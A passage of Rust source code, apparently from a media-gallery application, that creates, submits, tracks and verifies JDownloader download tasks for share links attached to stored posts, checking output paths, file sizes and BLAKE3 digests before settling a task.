            return Err(anyhow!("分享链接仅支持 http:// 或 https:// 协议: {link}"));
        }
    }
    if !links.is_empty()
        && frozen
            .iter()
            .any(|link| !post_links.iter().any(|known| known.trim() == link))
    {
        return Err(anyhow!("分享链接必须属于所选作品；不同作品请分别创建任务"));
    }
    let mut seen = std::collections::HashSet::new();
    let frozen: Vec<_> = frozen
        .into_iter()
        .filter(|link| seen.insert(link.clone()))
        .collect();

    // If new links were provided that were not in kemono_posts.external_links, record them
    let mut updated_links = post_links.clone();
    let mut changed = false;
    for l in &frozen {
        if !updated_links.contains(l) {
            updated_links.push(l.clone());
            changed = true;
        }
    }
    if changed {
        tx.execute(
            "UPDATE kemono_posts SET external_links=?1, updated_at=strftime('%s','now') WHERE id=?2",
            params![serde_json::to_string(&updated_links)?, post_id],
        )?;
    }

    let effective_password = match password {
        Some(p) if !p.trim().is_empty() => Some(p.trim().to_string()),
        _ => {
            let content: Option<String> = tx.query_row(
                "SELECT content FROM kemono_posts WHERE id=?1",
                [post_id],
                |row| row.get(0),
            ).optional()?.flatten();
            content.as_deref()
                .and_then(|c| crate::pawchive::extract_archive_passwords(c).into_iter().next())
        }
    };

    let task_id = format!("job_{}", uuid::Uuid::new_v4().simple());
    let now = now_secs();
    tx.execute(
        "INSERT INTO netdisk_bridge_tasks
             (task_id, bridge_id, session_id, work_id, post_id, manifest_version,
              expected, links, password, state, created_at, updated_at)
         VALUES (?1, ?2, ?3, ?4, ?5, ?6, '[]', ?7, ?8, 'issued', ?9, ?9)",
        params![
            task_id,
            bridge_id,
            session_id,
            work_id,
            post_id,
            manifest_version,
            serde_json::to_string(&frozen)?,
            effective_password.as_deref().unwrap_or(""),
            now
        ],
    )?;
    crate::netdisk_import::freeze_task_naming(&tx, &task_id, post_id)?;
    tx.commit()?;
    Ok(BridgeTask {
        task_id,
        bridge_id: bridge_id.to_string(),
        session_id: session_id.to_string(),
        work_id,
        post_id,
        manifest_version,
        expected: Vec::new(),
        links: frozen,
        password: effective_password,
        state: BRIDGE_TASK_REGISTERED.to_string(),
    })
}

/// Read one Gallery task by its identity.
pub fn load_bridge_task(conn: &Connection, task_id: &str) -> Result<Option<BridgeTask>> {
    let row: Option<(
        String,
        String,
        String,
        String,
        i64,
        i64,
        String,
        String,
        String,
        String,
    )> = conn
        .query_row(
            "SELECT task_id, bridge_id, session_id, work_id, post_id, manifest_version,
                    expected, links, password, state
             FROM netdisk_bridge_tasks WHERE task_id = ?1",
            params![task_id],
            |row| {
                Ok((
                    row.get(0)?,
                    row.get(1)?,
                    row.get(2)?,
                    row.get(3)?,
                    row.get(4)?,
                    row.get(5)?,
                    row.get(6)?,
                    row.get(7)?,
                    row.get::<_, Option<String>>(8)?.unwrap_or_default(),
                    row.get(9)?,
                ))
            },
        )
        .optional()?;
    Ok(row.map(|row| BridgeTask {
        task_id: row.0,
        bridge_id: row.1,
        session_id: row.2,
        work_id: row.3,
        post_id: row.4,
        manifest_version: row.5,
        expected: serde_json::from_str(&row.6).unwrap_or_default(),
        links: serde_json::from_str(&row.7).unwrap_or_default(),
        password: if row.8.is_empty() { None } else { Some(row.8) },
        state: row.9,
    }))
}

/// Queue the `add_links` command that submits a registered task to the download
/// list, and mark the task as submitted.
///
/// The parameters are built from the task's own frozen fields, so the explicit
/// action submits exactly what was reviewed. `autostart` stays false; the
/// script subsequently moves and force-starts only this task's resolved links.
pub fn submit_bridge_task(
    conn: &Connection,
    task: &BridgeTask,
    staging_dir: &str,
) -> Result<String> {
    validate_download_directory(staging_dir, "暂存目录")?;
    if task.state == BRIDGE_TASK_SETTLED {
        return Err(anyhow!("任务已结算，不能重复投递"));
    }
    if task.state == BRIDGE_TASK_SUBMITTED {
        return Err(anyhow!("任务已投递，等待下载器执行"));
    }
    if task.links.is_empty() {
        return Err(anyhow!("任务没有可投递的分享链接"));
    }
    // §6.6: the move consults JD's global auto-start, so it only happens once
    // the script has reported that setting as off. Refusing here rather than
    // after queueing keeps the task at 待开始, where 开始 can be pressed again
    // once the user has changed the setting in JD.
    if !bridge_move_is_isolated(conn, &task.bridge_id)? {
        return Err(anyhow!(
            "无法确认 JDownloader 的全局自动启动已关闭，已停止移入。请在 JDownloader 的\
             链接收集设置中关闭自动开始后重试；Gallery 不会替你修改该全局设置"
        ));
    }
    let mut params = serde_json::json!({
        "links": task.links.join("\n"),
        "packageName": task.package_name(),
        "destinationFolder": format!("{}/{}", staging_dir.trim().trim_end_matches(['/', '\\']), task.package_name()),
        "assignJobID": true,
        "autostart": false,
        "autoExtract": false,
        "deepDecrypt": false,
        "overwritePackagizerRules": true,
    });
    if let Some(pwd) = &task.password {
        if !pwd.trim().is_empty() {
            params["packagePassword"] = serde_json::json!(pwd.trim());
        }
    }
    let command_id =
        queue_bridge_command(conn, &task.bridge_id, &task.task_id, "add_links", &params)?;
    conn.execute(
        "UPDATE netdisk_bridge_tasks SET state = ?1, updated_at = strftime('%s','now')
         WHERE task_id = ?2 AND state = ?3",
        params![BRIDGE_TASK_SUBMITTED, task.task_id, BRIDGE_TASK_REGISTERED],
    )?;
    Ok(command_id)
}

/// How many of a post's delivered resources have been linked to a library item.
///
/// `(linked, total)`. Used to decide whether a retry is an engine retry or an
/// import retry, and to report honestly how much of a task is in the library.
pub fn post_evidence_state(conn: &Connection, post_id: i64) -> Result<(i64, i64)> {
    let has_evidence_column: bool = conn
        .query_row(
            "SELECT COUNT(*) FROM pragma_table_info('kemono_files')
             WHERE name = 'evidence_item_id'",
            [],
            |row| Ok(row.get::<_, i64>(0)? > 0),
        )
        .unwrap_or(false);
    if !has_evidence_column {
        return Ok((0, 0));
    }
    conn.query_row(
        "SELECT COALESCE(SUM(CASE WHEN evidence_item_id IS NOT NULL THEN 1 ELSE 0 END), 0),
                COUNT(*)
         FROM kemono_files WHERE post_id = ?1",
        params![post_id],
        |row| Ok((row.get(0)?, row.get(1)?)),
    )
    .map_err(Into::into)
}

/// One task as the settings panel has to show it.
fn start_directives(conn: &Connection, bridge_id: &str) -> Result<Vec<serde_json::Value>> {
    if !load_netdisk_settings(conn)?.enabled {
        return Ok(Vec::new());
    }
    let mut stmt = conn.prepare(
        "SELECT t.task_id FROM netdisk_bridge_tasks t
         WHERE t.bridge_id = ?1 AND t.state = 'submitted'
           AND COALESCE((SELECT action FROM netdisk_bridge_commands c
                         WHERE c.job_id = t.task_id ORDER BY c.id DESC LIMIT 1), '')
               IN ('add_links', 'resume')
         ORDER BY t.created_at LIMIT 100",
    )?;
    let ids = stmt
        .query_map(params![bridge_id], |r| r.get::<_, String>(0))?
        .collect::<rusqlite::Result<Vec<_>>>()?;
    Ok(ids
        .into_iter()
        .map(|id| serde_json::json!({"task_id": id, "start": true}))
        .collect())
}

/// One task as the settings panel has to show it.
///
/// The stored state is a protocol value (`issued` / `submitted` / `confirmed`);
/// the plan's §6.2 wording is what the user is allowed to read, so the
/// translation happens here, next to the facts it is derived from, rather than
/// in the browser where a missing fact would have to be guessed at.
///
/// The two states the plan lists that this does not produce are deliberate:
/// 已暂停 and 失败 are things the downloader has to report back, and Gallery
/// cannot claim them from a queued command. Anything it cannot substantiate
/// falls through to 待核对 instead of picking the closest-looking label.
pub fn bridge_task_view(conn: &Connection, task: &BridgeTask) -> Result<serde_json::Value> {
    let last_command: Option<(String, String, String)> = conn
        .query_row(
            "SELECT action, status, last_error FROM netdisk_bridge_commands
              WHERE job_id = ?1 ORDER BY id DESC LIMIT 1",
            params![task.task_id],
            |row| Ok((row.get(0)?, row.get(1)?, row.get(2)?)),
        )
        .optional()?;
    let (linked, total) = crate::netdisk_import::task_import_state(conn, task)?;
    let label = if task.state == BRIDGE_TASK_SETTLED {
        // 下载完成 is not 已入库: a settled receipt whose resources are not all
        // bound to a library item still owes the user an import.
        if total == 0 || linked < total {
            "待入库"
        } else {
            "已入库"
        }
    } else if last_command
        .as_ref()
        .map(|(_, status, _)| status == BRIDGE_COMMAND_UNCERTAIN)
        .unwrap_or(false)
    {
        "需处理"
    } else {
        match task.state.as_str() {
            state if state == BRIDGE_TASK_REGISTERED => "待开始",
            state if state == BRIDGE_TASK_SUBMITTED => {
                // A queued/accepted addLinks command is not download progress.
                let raw: Option<String> = conn
                    .query_row(
                        "SELECT records FROM netdisk_bridge_snapshots
                     WHERE bridge_id = ?1 AND task_id = ?2
                       AND updated_at >= CAST(strftime('%s','now') AS REAL) - 60
                     ORDER BY updated_at DESC LIMIT 1",
                        params![task.bridge_id, task.task_id],
                        |row| row.get(0),
                    )
                    .optional()?;
                let records: Vec<BridgeLinkStatus> = raw
                    .and_then(|value| serde_json::from_str(&value).ok())
                    .unwrap_or_default();
                if records.iter().any(|record| record.running) {
                    "下载中"
                } else {
                    "待核对"
                }
            }
            _ => "待核对",
        }
    };
    Ok(serde_json::json!({
        "task_id": task.task_id,
        "package_name": task.package_name(),
        "bridge_id": task.bridge_id,
        "work_id": task.work_id,
        "manifest_version": task.manifest_version,
        "expected_outputs": task.expected.len(),
        "link_count": task.links.len(),
        "state": task.state,
        "state_label": label,
        "linked": linked,
        "total": total,
        "last_command": last_command.as_ref().map(|(action, status, _)| serde_json::json!({
            "action": action,
            "status": status,
        })),
        "attention": crate::netdisk_import::import_error(conn, &task.task_id)?.or_else(|| last_command
            .as_ref()
            .map(|(_, status, error)| (status == BRIDGE_COMMAND_UNCERTAIN, error.clone()))
            .filter(|(uncertain, error)| *uncertain && !error.trim().is_empty())
            .map(|(_, error)| error)),
    }))
}

/// Every task Gallery currently tracks, newest first.
pub fn list_bridge_tasks(conn: &Connection, limit: i64) -> Result<Vec<BridgeTask>> {
    ensure_netdisk_bridge_schema(conn)?;
    let mut stmt = conn.prepare(
        "SELECT task_id FROM netdisk_bridge_tasks ORDER BY created_at DESC, rowid DESC LIMIT ?1",
    )?;
    let ids: Vec<String> = stmt
        .query_map(params![limit.clamp(1, 500)], |row| row.get(0))?
        .collect::<rusqlite::Result<Vec<String>>>()?;
    let mut tasks = Vec::new();
    for id in ids {
        if let Some(task) = load_bridge_task(conn, &id)? {
            tasks.push(task);
        }
    }
    Ok(tasks)
}

/// Freeze the identity set a task is expected to deliver.
///
/// The first report wins. A later report naming a different set describes a
/// changed manifest, which is not something this code may silently adopt: the
/// caller gets `false` and refuses to settle.
fn freeze_task_expectations(
    conn: &Connection,
    task: &BridgeTask,
    expected: &[String],
) -> Result<bool> {
    let mut clean: Vec<String> = expected
        .iter()
        .map(|id| id.trim().to_string())
        .filter(|id| !id.is_empty())
        .collect();
    clean.sort();
    clean.dedup();
    if clean.is_empty() {
        return Ok(task.expected.is_empty());
    }
    if !task.expected.is_empty() {
        return Ok(task.expected == clean);
    }
    conn.execute(
        "UPDATE netdisk_bridge_tasks SET expected = ?1, updated_at = strftime('%s','now')
         WHERE task_id = ?2 AND expected = '[]'",
        params![serde_json::to_string(&clean)?, task.task_id],
    )?;
    Ok(true)
}

/// Merge one page into its snapshot and report the merged state.
///
/// Records are merged by link identity, and a terminal observation is never
/// replaced by a non-terminal one: pages may arrive in any order, and an older
/// page must not be able to un-finish a link that has already completed.
fn merge_snapshot_page(
    conn: &Connection,
    bridge_id: &str,
    page: &BridgeSnapshotPage,
) -> Result<SnapshotState> {
    let existing: Option<(String, String, i64, i64)> = conn
        .query_row(
            "SELECT pages_seen, records, complete, settled FROM netdisk_bridge_snapshots
             WHERE bridge_id = ?1 AND task_id = ?2 AND snapshot_id = ?3",
            params![bridge_id, page.job_id, page.snapshot_id],
            |row| Ok((row.get(0)?, row.get(1)?, row.get(2)?, row.get(3)?)),
        )
        .optional()?;

    let mut pages_seen: BTreeSet<u32> = existing
        .as_ref()
        .and_then(|row| serde_json::from_str(&row.0).ok())
        .unwrap_or_default();
    let mut by_link: BTreeMap<String, BridgeLinkStatus> = existing
        .as_ref()
        .and_then(|row| serde_json::from_str::<Vec<BridgeLinkStatus>>(&row.1).ok())
        .unwrap_or_default()
        .into_iter()
        .map(|record| (record_key(&record), record))
        .collect();

    pages_seen.insert(page.page_index);
    let mut changed = Vec::new();
    for record in &page.records {
        let key = record_key(record);
        match by_link.get(&key) {
            Some(previous) => {
                if previous.is_completed() && !record.is_completed() {
                    continue;
                }
                if record_status_changed(previous, record) {
                    changed.push(record.clone());
                }
                by_link.insert(key, record.clone());
            }
            None => {
                changed.push(record.clone());
                by_link.insert(key, record.clone());
            }
        }
    }

    let records: Vec<BridgeLinkStatus> = by_link.into_values().collect();
    // The bridge is the only party that can say "this is the whole set", and it
    // may only do so once every page it announced has arrived. `pages_seen` is
    // therefore a real precondition, not decoration: a page that never arrives
    // keeps the snapshot incomplete instead of letting the last page's word
    // stand for the whole manifest.
    let contiguous = match pages_seen.iter().copied().max() {
        None => false,
        Some(highest) => (0..=highest).all(|index| pages_seen.contains(&index)),
    };
    let complete = page.complete
        && contiguous
        && (page.total_count == 0 || records.len() >= page.total_count as usize);

    let settled = existing.as_ref().map(|row| row.3).unwrap_or(0);

    conn.execute(
        "INSERT INTO netdisk_bridge_snapshots
             (bridge_id, task_id, snapshot_id, pages_seen, records, complete, settled, updated_at)
         VALUES (?1, ?2, ?3, ?4, ?5, ?6, ?7, strftime('%s','now'))
         ON CONFLICT(bridge_id, task_id, snapshot_id) DO UPDATE SET
             pages_seen = excluded.pages_seen,
             records = excluded.records,
             complete = excluded.complete,
             updated_at = excluded.updated_at",
        params![
            bridge_id,
            page.job_id,
            page.snapshot_id,
            serde_json::to_string(&pages_seen)?,
            serde_json::to_string(&records)?,
            complete as i64,
            settled
        ],
    )?;

    Ok(SnapshotState {
        complete,
        records,
        changed,
    })
}

/// The identity of one record within a snapshot. JD's link UUID when it is
/// usable, otherwise the record's own name so an unusable id is still tracked
/// instead of colliding with every other unusable record.
fn record_key(record: &BridgeLinkStatus) -> String {
    let id = record.link_id.trim();
    if !id.is_empty() {
        return id.to_string();
    }
    format!("unsafe:{}:{}", record.name, record.status)
}

fn record_status_changed(previous: &BridgeLinkStatus, current: &BridgeLinkStatus) -> bool {
    previous.status != current.status
        || previous.finished != current.finished
        || previous.download_path != current.download_path
}

/// The manifest members a post still requires, as `(file name, length, digest)`.
fn manifest_file_expectations(
    conn: &Connection,
    post_id: i64,
) -> Result<Vec<(String, Option<u64>, String)>> {
    let mut stmt = conn.prepare(
        "SELECT target_path, expected_length, COALESCE(expected_blake3, '')
         FROM kemono_files
         WHERE post_id = ?1 AND present_in_manifest = 1 AND target_path != ''",
    )?;
    let rows = stmt.query_map(params![post_id], |row| {
        Ok((
            row.get::<_, String>(0)?,
            row.get::<_, Option<i64>>(1)?,
            row.get::<_, String>(2)?,
        ))
    })?;
    let mut out = Vec::new();
    for row in rows {
        let (target_path, length, digest) = row?;
        let name = PathBuf::from(&target_path)
            .file_name()
            .map(|value| value.to_string_lossy().to_string())
            .unwrap_or_default();
        out.push((name, length.map(|value| value.max(0) as u64), digest));
    }
    Ok(out)
}

/// What a completed snapshot proves about one task.
#[derive(Debug, Clone)]
struct SettlementVerdict {
    settle: bool,
    reason: String,
    outputs: Vec<String>,
}

/// Decide whether a completed snapshot may settle its task.
///
/// Every condition here exists because the opposite answer was reachable in the
/// previous implementation: a task identified by a guessed row, a version read
/// from the post's *current* manifest, and a single output treated as proof of a
/// whole delivery.
fn evaluate_settlement(
    conn: &Connection,
    bridge_id: &str,
    session_id: &str,
    task: &BridgeTask,
    page: &BridgeSnapshotPage,
    state: &SnapshotState,
    roots: &MediaRoots,
) -> Result<SettlementVerdict> {
    let refuse = |reason: &str| SettlementVerdict {
        settle: false,
        reason: reason.to_string(),
        outputs: Vec::new(),
    };

    if task.bridge_id != bridge_id {
        return Ok(refuse("任务属于另一台下载器"));
    }
    if task.session_id != session_id {
        return Ok(refuse("任务属于另一次桥接会话，尚未对账"));
    }
    if page.manifest_version != 0 && page.manifest_version != task.manifest_version {
        return Ok(refuse("回执携带的清单版本与冻结版本不一致"));
    }
    if !state.complete {
        return Ok(refuse("清单快照尚未完整"));
    }
    if task.expected.is_empty() {
        return Ok(refuse("桥接尚未回报解析出的输出身份集合"));
    }
    let mut reported: Vec<String> = state
        .records
        .iter()
        .map(|record| record.link_id.trim().to_string())
        .filter(|id| !id.is_empty())
        .collect();
    reported.sort();
    reported.dedup();
    if reported != task.expected {
        return Ok(refuse("快照的输出身份集合与冻结集合不一致"));
    }

    let current_version: Option<i64> = conn
        .query_row(
            "SELECT manifest_version FROM kemono_posts WHERE id = ?1",
            params![task.post_id],
            |row| row.get(0),
        )
        .optional()?;
    let Some(current_version) = current_version else {
        return Ok(refuse("任务对应的作品已不存在"));
    };
    if current_version != task.manifest_version {
        return Ok(refuse("回执针对的清单版本已过期"));
    }

    let expectations = manifest_file_expectations(conn, task.post_id)?;
    let submitted: Option<String> = conn.query_row(
        "SELECT params FROM netdisk_bridge_commands WHERE job_id=?1 AND action='add_links' ORDER BY id DESC LIMIT 1",
        [&task.task_id], |r|r.get(0)).optional()?;
    let staging = submitted
        .map(|raw| -> Result<Option<PathBuf>> {
            let value: serde_json::Value = serde_json::from_str(&raw)?;
            Ok(value
                .get("destinationFolder")
                .and_then(|v| v.as_str())
                .filter(|v| !v.is_empty())
                .map(PathBuf::from))
        })
        .transpose()?
        .flatten();
    let by_link: BTreeMap<String, &BridgeLinkStatus> = state
        .records
        .iter()
        .map(|record| (record_key(record), record))
        .collect();

    let mut outputs = Vec::new();
    for expected_id in &task.expected {
        let Some(record) = by_link.get(expected_id) else {
            return Ok(refuse("冻结清单中仍有未回报的输出"));
        };
        if record.unsafe_id || record.link_id.trim().is_empty() {
            return Ok(refuse("回执包含超出安全整数范围的身份"));
        }
        if record.is_failed() {
            return Ok(refuse("冻结清单中存在失败的输出"));
        }
        if record.extraction_blocks_import() {
            return Ok(refuse("解压状态尚未终结"));
        }
        if !record.is_completed() {
            return Ok(refuse("冻结清单中仍有未完成的输出"));
        }
        let path = record.download_path.trim();
        if path.is_empty() {
            return Ok(refuse("已完成输出没有可确定的实际路径"));
        }
        let candidate = PathBuf::from(path);
        if let Some(staging) = staging.as_ref() {
            let under_staging = candidate.starts_with(staging)
                && crate::fs_util::safe_canonicalize(&candidate)
                    .ok()
                    .zip(crate::fs_util::safe_canonicalize(staging).ok())
                    .is_some_and(|(path, dir)| path.starts_with(dir));
            if !under_staging {
                return Ok(refuse("输出不在本任务的暂存目录内"));
            }
        }
        if !path_under_authorized_roots(&candidate, roots) {
            return Ok(refuse("输出路径不在授权媒体根内"));
        }
        let metadata = match std::fs::symlink_metadata(&candidate) {
            Ok(metadata) => metadata,
            Err(_) => return Ok(refuse("输出文件无法读取")),
        };
        if metadata.file_type().is_symlink() || !metadata.is_file() {
            return Ok(refuse("输出不是普通文件"));
        }
        if metadata.len() == 0 {
            return Ok(refuse("输出是空文件"));
        }
        if record.bytes_total_verified > 0 && metadata.len() != record.bytes_total_verified {
            return Ok(refuse("输出长度与下载器报告不符"));
        }
        if let Some((_, expected_length, digest)) = expectations
            .iter()
            .find(|(name, _, _)| !name.is_empty() && name == &record.name)
        {
            if let Some(expected_length) = expected_length {
                if *expected_length > 0 && metadata.len() != *expected_length {
                    return Ok(refuse("输出长度与清单不符"));
                }
            }
            if !digest.is_empty() {
                let actual = match blake3_file(&candidate) {
                    Ok(actual) => actual,
                    Err(_) => return Ok(refuse("输出摘要无法计算")),
                };
                if !actual.eq_ignore_ascii_case(digest) {
                    return Ok(refuse("输出摘要与清单不符"));
                }
            }
        }
        outputs.push(path.to_string());
    }
    if outputs.is_empty() {
        return Ok(refuse("回执未证明任何输出"));
    }
    Ok(SettlementVerdict {
        settle: true,
        reason: String::new(),
        outputs,
    })
}

fn blake3_file(path: &PathBuf) -> Result<String> {
    use std::io::Read;
    let mut file = std::fs::File::open(path)?;
    let mut hasher = blake3::Hasher::new();
    let mut buffer = vec![0u8; 64 * 1024];
    loop {
        let read = file.read(&mut buffer)?;
        if read == 0 {
            break;
        }
        hasher.update(&buffer[..read]);
    }
    Ok(hasher.finalize().to_hex().to_string())
}

fn request_digest(payload: &BridgeExchangePayload) -> Result<String> {
    let encoded = serde_json::to_vec(payload)?;
    let mut hasher = Sha256::new();
    hasher.update(&encoded);
    Ok(format!("{:x}", hasher.finalize()))
}

fn load_bridge_response(
    conn: &Connection,
    bridge_id: &str,
    session_id: &str,
    seq: u64,
) -> Result<Option<(String, String)>> {
    conn.query_row(
        "SELECT request_digest, response_json FROM netdisk_bridge_responses
         WHERE bridge_id = ?1 AND session_id = ?2 AND seq = ?3",
        params![bridge_id, session_id, seq as i64],
        |row| Ok((row.get(0)?, row.get(1)?)),
    )
    .optional()
    .map_err(Into::into)
}

fn store_bridge_response(
    conn: &Connection,
    payload: &BridgeExchangePayload,
    digest: &str,
    response: &BridgeExchangeResponse,
) -> Result<()> {
    let encoded = serde_json::to_string(response)?;
    conn.execute(
        "INSERT INTO netdisk_bridge_responses
             (bridge_id, session_id, seq, request_digest, response_json, created_at)
         VALUES (?1, ?2, ?3, ?4, ?5, strftime('%s','now'))
         ON CONFLICT(bridge_id, session_id, seq) DO UPDATE SET
             request_digest = excluded.request_digest,
             response_json = excluded.response_json,
             created_at = excluded.created_at",
        params![
            payload.bridge_id,
            payload.session_id,
            payload.seq as i64,
            digest,
            encoded
        ],
    )?;
    conn.execute(
        "DELETE FROM netdisk_bridge_responses
         WHERE bridge_id = ?1 AND session_id = ?2 AND seq NOT IN (
             SELECT seq FROM netdisk_bridge_responses
             WHERE bridge_id = ?1 AND session_id = ?2
             ORDER BY seq DESC LIMIT ?3
         )",
        params![
            payload.bridge_id,
            payload.session_id,
            BRIDGE_RESPONSE_WINDOW
        ],
    )?;
    Ok(())
}

fn record_bridge_session(conn: &Connection, payload: &BridgeExchangePayload) -> Result<()> {
    let capabilities = payload
        .capabilities
        .as_ref()
        .map(|value| serde_json::to_string(value).unwrap_or_default())
        .unwrap_or_default();
    let handshaked = payload.capabilities.is_some() as i64;
    conn.execute(
        "INSERT INTO netdisk_bridge_sessions
             (bridge_id, session_id, last_seq, last_ack, handshaked, capabilities,
              created_at, updated_at)
         VALUES (?1, ?2, ?3, ?4, ?5, ?6, strftime('%s','now'), strftime('%s','now'))
         ON CONFLICT(bridge_id, session_id) DO UPDATE SET
             last_seq = MAX(last_seq, excluded.last_seq),
             last_ack = MAX(last_ack, excluded.last_ack),
             handshaked = MAX(handshaked, excluded.handshaked),
             capabilities = CASE WHEN excluded.capabilities != '' THEN excluded.capabilities
                                 ELSE capabilities END,
             updated_at = excluded.updated_at",
        params![
            payload.bridge_id,
            payload.session_id,
            payload.seq as i64,
            payload.ack as i64,
            handshaked,
            capabilities
        ],
    )?;
    Ok(())
}

/// Whether the newest handshake for a bridge trusts the running script enough
/// to settle anything.
fn bridge_capabilities_trusted(conn: &Connection, bridge_id: &str) -> Result<bool> {
    Ok(bridge_capabilities(conn, bridge_id)?
        .map(|parsed| parsed.is_trusted())
        .unwrap_or(false))
}

/// The newest handshake a bridge reported, if it reported one.
fn bridge_capabilities(conn: &Connection, bridge_id: &str) -> Result<Option<BridgeCapabilities>> {
    let row: Option<(String, i64)> = conn
        .query_row(
            "SELECT capabilities, handshaked FROM netdisk_bridge_sessions
             WHERE bridge_id = ?1
             AND updated_at >= CAST(strftime('%s','now') AS INTEGER) - ?2
             ORDER BY updated_at DESC, rowid DESC LIMIT 1",
            params![bridge_id, NETDISK_HEARTBEAT_TIMEOUT_SECS],
            |row| Ok((row.get(0)?, row.get(1)?)),
        )
        .optional()?;
    let Some((capabilities, handshaked)) = row else {
        return Ok(None);
    };
    if handshaked != 1 || capabilities.trim().is_empty() {
        return Ok(None);
    }
    Ok(Some(
        serde_json::from_str(&capabilities).unwrap_or_default(),
    ))
}

/// The pre-check `PLAN_NETDISK_JDOWNLOADER_2026-09-14.md` §6.6 requires before
/// any link is moved into JD's download list.
///
/// `moveToDownloadlist` reads JD's global `LINKGRABBER_AUTO_START_ENABLED` and
/// uses it as the final auto-start decision, so a move is only isolated when the
/// installed script has reported that setting as off. Gallery never reads or
/// writes JD's configuration itself; when the answer is missing or positive the
/// move stops and the user is told to change it in JD.
pub fn bridge_move_is_isolated(conn: &Connection, bridge_id: &str) -> Result<bool> {
    ensure_netdisk_bridge_schema(conn)?;
    Ok(bridge_capabilities(conn, bridge_id)?
        .map(|capabilities| capabilities.move_is_isolated())
        .unwrap_or(false))
}

/// The session a newly issued task should be bound to.
///
/// A task names the session that created it, so a report from a different run
/// is refused until that run handshakes and adopts the task. Issuing a task
/// before any handshake would bind it to nothing, so the caller is told to
/// pair the bridge first.
pub fn latest_bridge_session(conn: &Connection, bridge_id: &str) -> Result<Option<String>> {
    ensure_netdisk_bridge_schema(conn)?;
    let row: Option<(String, i64)> = conn
        .query_row(
            "SELECT session_id, handshaked FROM netdisk_bridge_sessions
             WHERE bridge_id = ?1
             AND updated_at >= CAST(strftime('%s','now') AS INTEGER) - ?2
             ORDER BY updated_at DESC, rowid DESC LIMIT 1",
            params![bridge_id, NETDISK_HEARTBEAT_TIMEOUT_SECS],
            |row| Ok((row.get(0)?, row.get(1)?)),
        )
        .optional()?;
    if !bridge_capabilities_trusted(conn, bridge_id)? {
        return Ok(None);
    }
    Ok(row
        .filter(|(_, handshaked)| *handshaked == 1)
        .map(|(id, _)| id))
}

/// The bridge identity a task is issued under.
pub fn default_bridge_identity() -> &'static str {
    "jd-local"
}

/// Hand a restarted bridge the tasks its previous session owned.
///
/// Only tasks that were merely issued move across. A task in `uncertain` is
/// deliberately left alone: its command may already have had an effect, and
/// re-adopting it without a reconciliation is exactly the guess this protocol
/// refuses to make.
fn adopt_bridge_tasks(conn: &Connection, bridge_id: &str, session_id: &str) -> Result<usize> {
    let changed = conn.execute(
        "UPDATE netdisk_bridge_tasks SET session_id = ?1, updated_at = strftime('%s','now')
         WHERE bridge_id = ?2 AND session_id != ?1 AND state = ?3",
        params![session_id, bridge_id, BRIDGE_COMMAND_ISSUED],
    )?;
    Ok(changed)
}

/// Answer the commands this bridge should act on.
///
/// A command already `issued` is re-sent with the same identity so the bridge
/// can de-duplicate it. For a side-effecting action that retransmit also moves
/// the command to `uncertain`: Gallery no longer knows whether the first copy
/// landed, and pretending otherwise is how a link gets added twice.
fn dispatch_bridge_commands(conn: &Connection, bridge_id: &str) -> Result<Vec<BridgeCommand>> {
    let mut stmt = conn.prepare(
        "SELECT id, command_id, job_id, action, params, status, attempts
         FROM netdisk_bridge_commands
         WHERE bridge_id = ?1 AND status IN (?2, ?3, ?4)
         ORDER BY id ASC
         LIMIT 50",
    )?;
    let rows = stmt
        .query_map(
            params![
                bridge_id,
                BRIDGE_COMMAND_QUEUED,
                BRIDGE_COMMAND_ISSUED,
                BRIDGE_COMMAND_UNCERTAIN
            ],
            |row| {
                Ok((
                    row.get::<_, i64>(0)?,
                    row.get::<_, String>(1)?,
                    row.get::<_, String>(2)?,
                    row.get::<_, String>(3)?,
                    row.get::<_, String>(4)?,
                    row.get::<_, String>(5)?,
                    row.get::<_, i64>(6)?,
                ))
            },
        )?
        .collect::<rusqlite::Result<Vec<_>>>()?;
    drop(stmt);

    let mut commands = Vec::new();
    let mut max_id = 0i64;
    for (id, command_id, job_id, action, params_str, status, attempts) in rows {
        let next_attempts = attempts + 1;
        if next_attempts > BRIDGE_COMMAND_ATTEMPT_CAP {
            conn.execute(
                "UPDATE netdisk_bridge_commands SET status = ?1 WHERE id = ?2",
                params![BRIDGE_COMMAND_UNCERTAIN, id],
            )?;
            continue;
        }
        let next_status = if status == BRIDGE_COMMAND_QUEUED {
            BRIDGE_COMMAND_ISSUED
        } else if SIDE_EFFECT_ACTIONS.contains(&action.as_str()) {
            BRIDGE_COMMAND_UNCERTAIN
        } else {
            BRIDGE_COMMAND_ISSUED
        };
        conn.execute(
            "UPDATE netdisk_bridge_commands
             SET status = ?1, attempts = ?2, dispatched_at = strftime('%s','now')
             WHERE id = ?3",
            params![next_status, next_attempts, id],
        )?;
        let params_val: serde_json::Value =
            serde_json::from_str(&params_str).unwrap_or(serde_json::Value::Null);
        commands.push(BridgeCommand {
            command_id,
            job_id,
            action,
            params: params_val,
        });
        if id > max_id {
            max_id = id;
        }
    }
    let _ = max_id;
    Ok(commands)
}

/// Apply the bridge's acknowledgement of a command.
///
/// An acknowledgement is the only thing that completes a command. A transport
/// sequence number is not one, and neither is a later heartbeat: `uncertain`
/// stays until the bridge actually reports the outcome.
fn settle_bridge_command(
    conn: &Connection,
    bridge_id: &str,
    command_id: &str,
    ok: bool,
    detail: &str,
) -> Result<()> {
    let trimmed = command_id.trim();
    if trimmed.is_empty() {
        return Ok(());
    }
    let attempts: Option<i64> = conn
        .query_row(
            "SELECT attempts FROM netdisk_bridge_commands WHERE bridge_id = ?1 AND command_id = ?2",
            params![bridge_id, trimmed],
            |row| row.get(0),
        )
        .optional()?;
    let Some(attempts) = attempts else {
        return Ok(());
    };
    let next = if ok {
        BRIDGE_COMMAND_CONFIRMED
    } else if attempts >= BRIDGE_COMMAND_ATTEMPT_CAP {
        BRIDGE_COMMAND_UNCERTAIN
    } else {
        BRIDGE_COMMAND_QUEUED
    };
    conn.execute(
        "UPDATE netdisk_bridge_commands
         SET status = ?1, last_error = ?2,
             completed_at = CASE WHEN ?1 = ?3 THEN strftime('%s','now') ELSE completed_at END
         WHERE bridge_id = ?4 AND command_id = ?5",
        params![next, detail, BRIDGE_COMMAND_CONFIRMED, bridge_id, trimmed],
    )?;
    Ok(())
}

fn log_bridge_event(conn: &Connection, level: &str, kind: &str, message: &str, detail: &str) {
    let _ = conn.execute(
        "INSERT INTO pawchive_events (created_at, level, kind, message, detail)
         VALUES (strftime('%Y-%m-%dT%H:%M:%fZ','now'), ?1, ?2, ?3, ?4)",
        params![level, kind, message, detail],
    );
}

